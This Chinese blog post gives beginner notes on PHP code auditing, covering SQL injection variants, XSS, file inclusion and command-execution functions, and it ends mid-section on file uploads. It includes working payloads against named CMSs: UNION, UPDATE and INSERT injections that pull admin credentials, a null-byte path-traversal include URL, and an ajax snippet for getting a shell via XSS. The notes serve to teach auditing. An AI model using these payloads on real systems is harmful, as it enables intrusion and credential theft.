<!DOCTYPE html>
<html>
  <head><meta name="generator" content="Hexo 3.9.0">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta name="referrer" content="no-referrer">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  <meta name="description" content="关注网络安全">
  <meta name="keyword" content="web安全 代码审计">
  
    <link rel="shortcut icon" href="/css/images/logo.png">
  
  <title>
    
      PHP代码审计基础笔记-90sec | 影风博客
    
  </title>
  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/[object Object].min.css" rel="stylesheet">
  <link rel="stylesheet" href="/css/style.css">
  
  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
  
    <script src="/js/qrious.js"></script>
  
  
  
  
    <!-- MathJax support START -->
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
    <!-- MathJax support END -->
  


<link rel="stylesheet" href="/css/prism-story.css" type="text/css">
<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
<div class="wechat-share">
  <img src="/css/images/logo.png">
</div>

  <body>
    <header class="header fixed-header">
  <div class="header-container">
    <a class="home-link" href="/">
      <div class="logo"></div>
      <span>影风博客</span>
    </a>
    <ul class="right-list">
      
        <li class="list-item">
          
            <a href="/" class="item-link">主页</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/archives/" class="item-link">归档</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/tags/" class="item-link">标签</a>
          
        </li>
      
        <li class="list-item">
          
            <a href="/about/" class="item-link">关于</a>
          
        </li>
      
    </ul>
    <div class="menu">
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
      <span class="icon-bar"></span>
    </div>
    <div class="menu-mask">
      <ul class="menu-list">
        
          <li class="menu-item">
            
              <a href="/" class="menu-link">主页</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/archives/" class="menu-link">归档</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/tags/" class="menu-link">标签</a>
            
          </li>
        
          <li class="menu-item">
            
              <a href="/about/" class="menu-link">关于</a>
            
          </li>
        
      </ul>
    </div>
  </div>
</header>

    <div id="article-banner">
  <h2>PHP代码审计基础笔记-90sec</h2>
  <p class="post-date">2019-03-20</p>
  <div class="arrow-down">
    <a href="javascript:;"></a>
  </div>
</div>
<main class="app-body flex-box">
  <!-- Article START -->
  <article class="post-article">
    <section class="markdown-content"><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>这阵子在学<code>php</code>代码审计，算是一个笔记。留着以后看。<br><code>php</code>代码审计需要比较强的代码能力以及足够的耐心…..<br>至于如何学好<code>php</code>代码审计？去膜拜<code>p</code>神吧….</p>
<pre><code>http://wooyun.org/whitehats/phith0n
http://www.leavesongs.com/</code></pre><p>看着<code>p</code>神的文章，学审计……  许多东西都是复制<code>p</code>神~</p>
<p>文章写给像我一样刚刚开始审计的小菜鸟<del>,有错欢迎指出</del></p>
<p>求勿喷………..继续学审计中……..</p>
<p>=====================================================</p>
<h2 id="0x02-审计前奏"><a href="#0x02-审计前奏" class="headerlink" title="0x02 审计前奏"></a>0x02 审计前奏</h2><h3 id="一-关注变量-函数"><a href="#一-关注变量-函数" class="headerlink" title="一)关注变量+函数"></a>一)关注变量+函数</h3><pre><code>1.可以控制的变量 [一切输入都是有害的]

2.变量到达有利用价值的函数[危险函数] [一切进入函数的变量是有害的]</code></pre><p>——来源<code>t00ls</code></p>
<p>客户端提交变量:</p>
<pre><code>$_GET：http://localhost/mm.php?a=xxxxx
$_POST:
$_COOKIE:</code></pre><p>记录在我们本地浏览器中的变量是可控的。<code>PHP</code>中还有一个变量<code>$_SESSION</code>。</p>
<p>每个人访问网站，他的<code>phpsessid</code>都是不一样的，这个值就用来区分每个用户。服务器用<code>PHPSESSID=cmebf7jkflu5a31vf67kbiopk4</code>来标示每个用户，是否登录或者是否是管理员。</p>
<pre><code>$_FILES:</code></pre><p>可能产生的漏洞类型：</p>
<p>01.上传漏洞，上传一个<code>php</code>木马，相当于直接<code>getshell</code>了</p>
<p>02.注入，有些<code>cms</code>会把<code>name</code>的值保存在数据库里，但又没有对<code>name</code>进行过滤。</p>
<pre><code>$_SERVER:其中部分我们可以控制。
X-FORWARDED-FOR:IP地址，很多cms取ip是首先取这个变量中的值，如果没有这个变量，才去取我们的真实IP。
Referer:来源地址，我们访问目标页面的来源
Host:目标网址这几个变量就是我们php中间用户可以控制的变量。大部分的漏洞都是从这几个变量开始展开的。
$_REQUEST:就是$GET/$_POST/$COOKIE</code></pre><p>要是使用了<code>xxx</code>框架的话，如何找到这些变量呢？</p>
<p><code>MVC</code>框架比较流行了</p>
<p>所以我去了解了一下<code>thinkphp</code>的<code>mvc</code>框架</p>
<p>=====================================================</p>
<h3 id="二-关注什么样的漏洞"><a href="#二-关注什么样的漏洞" class="headerlink" title="二)关注什么样的漏洞"></a>二)关注什么样的漏洞</h3><pre><code>1.SQL注入
2.文件操作[上传/写入/读取/删除]
3.文件包含
4.命令执行
5.XSS
6.Cookie欺骗
7.逻辑出错........等等</code></pre><p>每种漏洞有对应找漏洞的方法，往往先找<code>getshell</code>的方法 [1,2,3,4这三中漏洞是常见的<code>getshell</code>方法我们要多多关注这个] 而逻辑出错也是很要命的。</p>
<p>所以我们要认识清楚漏洞原理，积累<code>cms</code>常出漏洞，积累找这种漏洞的技巧</p>
<p>=====================================================</p>
<h3 id="三-本地搭建环境测试"><a href="#三-本地搭建环境测试" class="headerlink" title="三)本地搭建环境测试"></a>三)本地搭建环境测试</h3><p>1.黑盒加白盒</p>
<p>不得不说黑盒的重要性！</p>
<p><code>Burp</code>常开对你只要没有坏处！</p>
<p>2.大体看看文件的目录</p>
<p>3.<code>cms</code>安装到本地，大概了解功能，比如有注册会员功能的<code>cms</code>，我就注册一个会员，比如有搜索框，我就会搜索一下，大概查看一下搜索出来的内容。</p>
<p>[恩 因为字符型都进行了转换<code>@ _@</code>所以搜索型的很重要,有哪些数据提交点、能否留言等等]</p>
<p>——摘自<code>p</code>神</p>
<p>技巧:最好可见在本地测试时候讲你的输入点打印出来</p>
<p>我会将用户的输入数据进行<code>var_dump</code>，重要的是对最终的<code>sql</code>语句进行<code>var_dump</code>,这和给你省去很多力气！我们只要<code>var_dump($sql)</code>然后再可以去黑盒测试，[比如搜索框，用户登入，文件上传名称等等]。</p>
<p>我审计了一个<code>cms</code>就是这样的，结果黑盒就发现登入处有注入，真的去审计还花了不少力气去读源码，并且学会了一个<code>thinkphp</code>的执行<code>sql</code>特点。</p>
<p>=====================================================</p>
<h3 id="四-审计各种不同漏洞技巧"><a href="#四-审计各种不同漏洞技巧" class="headerlink" title="四)审计各种不同漏洞技巧"></a>四)审计各种不同漏洞技巧</h3><h4 id="1-sql注入审计技巧"><a href="#1-sql注入审计技巧" class="headerlink" title="1.sql注入审计技巧"></a>1.sql注入审计技巧</h4><p><code>sql</code>注入是我们审计比较重视的漏洞之一</p>
<h5 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h5><p>所以现在很多<code>cms</code>都对注入进行了一定的过滤，一般有两种过滤方法：</p>
<p>01.对于数字型的输入，直接使用<code>intval($_GET[id])</code>，强制转换成整数，这种过滤是毫无办法的。</p>
<pre><code>$ann_id = !empty($_REQUEST[&#39;ann_id&#39;]) ? intval($_REQUEST[&#39;ann_id&#39;]) : &#39;&#39;;</code></pre><p>要是没有<code>intval($_GET[id])</code> 那就呵呵了。有一个屌丝<code>cms</code>就是这样……</p>
<pre><code>ad_js.php?ad_id=1%20union%20select%201,2,3,4,5,6,(select%20concat(admin_name,0x23,email,0x23,pwd)%20from%20blue_admin)</code></pre><p>02.有些输入是字符型的，不可能转换成数字。这个使用就使用<code>addslashes</code>对输入进行转义。</p>
<pre><code>aaa&#39;aa ==&gt; aaa\&#39;aa
aaa\aa ==&gt; aaa\\aa
SELECT * FROM post WHERE id=&#39;aaa\&#39; union select pwd from admin limit 0,1#</code></pre><p>=====================================================</p>
<h5 id="0x02-漏洞发生"><a href="#0x02-漏洞发生" class="headerlink" title="0x02 漏洞发生"></a>0x02 漏洞发生</h5><p>要是过滤不是上面这几中，而是黑名单，或者你欠日什么都没有过滤的话，那么很多情况下是可以注入的。所以<code>cms</code>随着漏洞的爆出，慢慢的这样的情况几乎都没有了</p>
<p>那么问题来了，在上面这种情况漏洞怎么出现？[蓝翔…..]</p>
<p>漏洞（一） <code>ip</code>没过滤直接进到<code>sql</code>语句</p>
<p>函数讲解：</p>
<pre><code>getenv: 这个函数是获得环境变量的函数，也可以用来获得$_SERVER数组的信息。
getenv(&#39;HTTP_X_FORWARDED_FOR&#39;) --&gt; $_SERVER[HTTP_X_FORWARDED_FOR]</code></pre><p>当然<code>http</code>头还有<code>referer</code> 这也是可以伪装的，要是没有过滤好也会产生会注入问题</p>
<p>漏洞（二） 宽字节注入 [对字符]</p>
<p>如果发现<code>cms</code>是<code>GBK</code> 只有看看 能不能宽字节注入</p>
<p><code>sqlmap</code> 的<code>unmagicquotes.py</code>可以进行宽字测试</p>
<p>下面摘自<code>p</code>神写的:<code>浅析白盒审计中的字符编码及SQL注射.pdf</code></p>
<p>解决宽字节注入办法:</p>
<pre class="line-numbers language-sql"><code class="language-sql">mysql_query<span class="token punctuation">(</span><span class="token string">"SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary"</span><span class="token punctuation">,</span> $conn<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>到这里就一般高枕无忧了…..</p>
<p>但是 要是画蛇添足得使用<code>iconv</code>就可能出现问题了</p>
<p>有些<code>cms</code>会加上下面语句避免乱码：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token function">iconv</span><span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">,</span> <span class="token string">'gbk'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>将传入的<code>word</code>有<code>utf-8</code>转成<code>gbk</code>…..</p>
<p>发现<code>錦</code>的<code>utf-8</code>编码是<code>0xe98ca6</code>，而的<code>gbk</code>编码是<code>0xe55c</code></p>
<p>我们输入<code>錦&#39;</code> –&gt;<code>%e5%5c%27</code>【<code>%5c</code>就是<code>\</code>】</p>
<p>在经过转义——&gt;<code>%e5%5c%5c%27</code>【<code>5c%5c</code>就是<code>\\</code>】这样我们就有可以开心的注入了….</p>
<p>漏洞（三）<code>sql</code>二次注入</p>
<p>例如:<code>p</code>神的<code>HDWiki</code>二次注入</p>
<p>漏洞（四）文件名注入</p>
<p>因为<code>$_FILE</code>，<code>$_SERVER</code>不受<code>gpc</code>影响，那么可能造成注入…….</p>
<p>有些<code>cms</code>会把<code>name</code>的值保存在数据库里，但又没有对<code>name</code>进行过滤。</p>
<p>例如:<code>p</code>神的<code>emlog</code>后台注入（需要作者权限即可）</p>
<p>还有<code>Thinksaas</code>最新版注入无视<code>GPC</code></p>
<pre><code>http://wooyun.org/bugs/wooyun-2010-051124</code></pre><p>=====================================================</p>
<h5 id="0x03-注入类型"><a href="#0x03-注入类型" class="headerlink" title="0x03 注入类型"></a>0x03 注入类型</h5><p>1.<code>selcet</code>注入 这个常见就不说了</p>
<p>一般就是联查，要是报错开启也可以报错注入</p>
<p>2.<code>update</code> 注入</p>
<p><code>p</code>神做了一个教程关于<code>bluecms</code>这<code>cms</code>漏洞：</p>
<p><code>get_ip()</code>直接用了<code>X-FORWARDED-FOR</code></p>
<pre class="line-numbers language-sql"><code class="language-sql">$sql <span class="token operator">=</span> <span class="token string">"UPDATE blue_user SET last_login_time = '$last_login_time', last_login_ip = '可控位置' WHERE user_id='$_SESSION[user_id]'"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">UPDATE</span> blue_user <span class="token keyword">SET</span> last_login_time <span class="token operator">=</span> <span class="token string">'1394368489'</span><span class="token punctuation">,</span> last_login_ip <span class="token operator">=</span> <span class="token string">'8.8.8.8'</span><span class="token punctuation">,</span>address<span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>admin_name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>email<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span> <span class="token keyword">from</span> blue_admin <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> qq<span class="token operator">=</span><span class="token string">' '</span> <span class="token keyword">WHERE</span> user_id<span class="token operator">=</span><span class="token string">'2'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>//<code>addrress</code>是前台可见的，而且长度够大</p>
<p>//<code>p</code>神说…..</p>
<p>碰到<code>update</code>语句中含有注入的情况，我们怎么处理？</p>
<p>01.跟我刚才一样，把某个可以看到的信息给更新成管理员密码，这样就获得了密码</p>
<p>02.报错注入，使用某一特定的报错语句，让<code>sql</code>语句在执行中出错，能爆出管理员账号密码。但是有个条件，就是在执行<code>sql</code>语句的时候调用了<code>mysql_error</code>函数，否则不会显示报错信息。比如<code>bluecms</code>就没有调用<code>mysql_error</code>，所以不能使用这个方法。</p>
<p>3.<code>insert</code> 注入</p>
<p>引用了音符牛的一个文章</p>
<p><a href="http://bbs.xdsec.org/?/question/310" target="_blank" rel="noopener">http://bbs.xdsec.org/?/question/310</a></p>
<p>音符的<code>XD</code>某套系统的代码审计第二弹：insert注入</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//字符串完全没过滤，gpc为关闭</span>
<span class="token keyword">function</span> <span class="token function">guest_add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//添加留言</span>
<span class="token punctuation">{</span>
<span class="token keyword">global</span> <span class="token variable">$bqz</span><span class="token punctuation">,</span><span class="token variable">$lang</span><span class="token punctuation">;</span>
<span class="token variable">$exec</span><span class="token operator">=</span><span class="token string">"insert into "</span><span class="token punctuation">.</span><span class="token variable">$bqz</span><span class="token punctuation">.</span><span class="token string">"guest (title,name,email,ip,content,times) values ('"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"')"</span><span class="token punctuation">;</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$exec</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string">"&lt;script>alert('"</span><span class="token punctuation">.</span><span class="token variable">$lang</span><span class="token punctuation">.</span>"<span class="token string">');window.location.href='</span>http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//bbs.xdsec.org/?/guest.php';&lt;/script>";</span>
<span class="token punctuation">}</span>
<span class="token variable">$exec</span><span class="token operator">=</span><span class="token string">"insert into "</span><span class="token punctuation">.</span><span class="token variable">$bqz</span><span class="token punctuation">.</span><span class="token string">"guest (title,name,email,ip,content,times) values ('"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_SERVER</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">.</span><span class="token string">"','"</span><span class="token punctuation">.</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"')"</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//没有过滤就将数据放入guest表中，guest表的内容前台可见。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>payload</code>:</p>
<pre><code>标题123&#39;,&#39;1&#39;,&#39;haha&#39;,&#39;1.1.1.1&#39;,(select concat(admin_name,0x23,admin_password) from xxx_admin limit 0,1),&#39;1314205172&#39;)#</code></pre><p>其他的随便填。</p>
<p>则执行：</p>
<pre class="line-numbers language-sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> xdxx_guest <span class="token punctuation">(</span>title<span class="token punctuation">,</span>name<span class="token punctuation">,</span>email<span class="token punctuation">,</span>ip<span class="token punctuation">,</span>content<span class="token punctuation">,</span>times<span class="token punctuation">)</span> <span class="token keyword">values</span> <span class="token punctuation">(</span><span class="token string">'123'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">,</span><span class="token string">'haha'</span><span class="token punctuation">,</span><span class="token string">'1.1.1.1'</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span>admin_name<span class="token punctuation">,</span><span class="token number">0x23</span><span class="token punctuation">,</span>admin_password<span class="token punctuation">)</span> <span class="token keyword">from</span> xdxx_admin <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'1314205172'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#','time()')</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>因为前台可以看到的只有<code>name</code>跟<code>content</code>，而<code>name</code>要用来闭合前面的单引号，所以用<code>content</code>字段来保存管理员的账号密码。</p>
<h5 id="0x04技巧"><a href="#0x04技巧" class="headerlink" title="0x04技巧"></a>0x04技巧</h5><p>技巧:最好可见在本地测试时候讲你的输入点打印出来</p>
<p>我会将用户的输入数据进行<code>var_dump</code></p>
<p>重要的是对最终的<code>sql</code>语句进行<code>var_dump</code>,这和给你省去很多力气！我们只要<code>var_dump($sql)</code>然后再可以去黑盒测试，[比如搜索框，用户登入，文件上传名称等等]</p>
<p><code>so</code>，还是这技巧点</p>
<p>=====================================================</p>
<h4 id="2-xss审计技巧"><a href="#2-xss审计技巧" class="headerlink" title="2.xss审计技巧"></a>2.<code>xss</code>审计技巧</h4><p><code>xss</code>最常见就在留言板地方了！</p>
<p>1.先可以黑盒:</p>
<p>我们可以对<code>fuzz</code>，加载你的<code>xss</code>，<code>payload</code>都试试。[可以积累你的xsspayload]</p>
<p>然后去管理后台看看。有没有执行<code>xss</code>成功<br>学习<code>xss</code>:</p>
<pre><code>http://www.wooyun.org/bugs/wooyun-2010-015957</code></pre><p>心伤的瘦子专辑…….</p>
<p>2.看代码看看如何过滤了，再看看能不能绕过。</p>
<p>这就要靠你的本领了</p>
<p>但是现在可多就都过滤了</p>
<p>用了<code>htmlspecialchars</code>进行过滤， = =</p>
<p>一个<code>tip</code>:</p>
<p>不少<code>cms</code>会对留言者的<code>ip</code>进行记录。</p>
<p>而他们用一个具有漏洞的函数：</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">/***获取客户端IP地址*/</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">getip</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$onlineip</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
     <span class="token variable">$onlineip</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_CLIENT_IP'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$onlineip</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'HTTP_X_FORWARDED_FOR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$onlineip</span> <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strcasecmp</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'unknown'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$onlineip</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token keyword">return</span> <span class="token variable">$onlineip</span><span class="token punctuation">;</span>　
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>当<code>HTTP_X_FORWARDED_FOR</code>存在时获取的<code>IP</code>就是它，但是<code>HTTP_X_FORWARDED_FOR</code>是可以伪造的，但是存<code>ip</code>的字段，有是比较小的。我们去看看<code>p</code>神如何绕过:</p>
<pre><code>http://wooyun.org/bugs/wooyun-2010-045687</code></pre><p>我只能说，吊死了  = =</p>
<p>请收下我的膝盖……</p>
<p>3.<code>xss</code>利用</p>
<p>现在应该大多都是<code>x</code>管理员的<code>cookie</code>吧。</p>
<p>再次膜拜一下<code>p</code>神的审计能力，<code>xss</code>的作用可以<code>getshell</code>的</p>
<pre><code>http://wooyun.org/bugs/wooyun-2010-063052</code></pre><p>我们可以利用<code>js</code>来发送<code>post</code>包，利用管理员权限去得到<code>getshell</code>:</p>
<pre><code>$.ajax({ &quot;url&quot;: &quot;网址&quot;, &quot;type&quot;: &quot;POST&quot;,&quot;data&quot;:&quot;POST的内容&quot; })</code></pre><p>我也是刚刚知道这个知识 搞定一个<code>cms</code>…….</p>
<p>=====================================================</p>
<h4 id="3-文件包含漏洞审计技巧"><a href="#3-文件包含漏洞审计技巧" class="headerlink" title="3.文件包含漏洞审计技巧"></a>3.文件包含漏洞审计技巧</h4><p>文件包含漏洞</p>
<p>看音符大牛的文章:</p>
<pre><code>https://www.t00ls.net/thread-26571-1-3.html</code></pre><p>1.截断技巧</p>
<pre><code>%00和230个/</code></pre><p>2.远程包含</p>
<p><code>allow_url_fopen = On</code>并且<code>allow_url_include = On</code>时，则可以包含远程文件</p>
<p>3.一个出问题的<code>cms</code></p>
<p><code>yxcms</code>给音符牛日穿了</p>
<pre><code>https://www.t00ls.net/viewthread.php?tid=27266&amp;highlight=yxcms</code></pre><p><code>payload</code>:</p>
<pre><code>http://test.com/cms//YXcmsApp1.2.3/index.php?r=..\..\upload\member\image\20140504\thumb_1399213415.jpg%00</code></pre><h4 id="4-命令执行审计技巧"><a href="#4-命令执行审计技巧" class="headerlink" title="4.命令执行审计技巧"></a>4.命令执行审计技巧</h4><p>没有什么技巧</p>
<h5 id="0x01-搜索可以执行php代码的函数"><a href="#0x01-搜索可以执行php代码的函数" class="headerlink" title="0x01 搜索可以执行php代码的函数"></a><code>0x01</code> 搜索可以执行<code>php</code>代码的函数</h5><pre><code>eval,assert....</code></pre><h5 id="0x02-搜索可以执行系统命令的函数"><a href="#0x02-搜索可以执行系统命令的函数" class="headerlink" title="0x02 搜索可以执行系统命令的函数"></a><code>0x02</code> 搜索可以执行系统命令的函数</h5><pre class="line-numbers language-php"><code class="language-php">system<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>``<span class="token punctuation">(</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span></span>反单引号<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span></span>）<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h4 id="5-文件操作审计技巧"><a href="#5-文件操作审计技巧" class="headerlink" title="5.文件操作审计技巧"></a>5.文件操作审计技巧</h4><h5 id="5-1-两个小知识，一个tip"><a href="#5-1-两个小知识，一个tip" class="headerlink" title="5.1 .两个小知识，一个tip"></a>5.1 .两个小知识，一个<code>tip</code></h5><p>1.文件上传参数</p>
<pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span> <span class="token operator">-</span> 被上传文件的名称
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">-</span> 被上传文件的类型
<span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span> <span class="token operator">-</span> 被上传文件的大小，以字节计
